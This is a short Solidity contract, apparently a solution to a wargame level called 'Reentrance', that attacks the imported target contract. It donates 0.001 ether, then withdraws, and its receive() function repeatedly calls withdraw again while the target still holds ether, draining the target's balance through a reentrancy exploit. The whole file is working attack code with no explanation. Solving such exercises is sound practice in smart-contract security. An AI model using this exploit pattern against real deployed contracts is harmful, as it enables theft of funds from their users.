// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract ReentranceAttack{
    Reentrance public addr;
    function att(Reentrance addr1) public payable  {
        addr = addr1;
        Reentrance(addr1).donate{value : 0.001 ether}(address(this));
        Reentrance(addr1).withdraw(0.001 ether);
    }
    receive() external payable {
        if(address(addr).balance >= 0.001 ether){
            addr.withdraw(0.001 ether);
        }
    }
}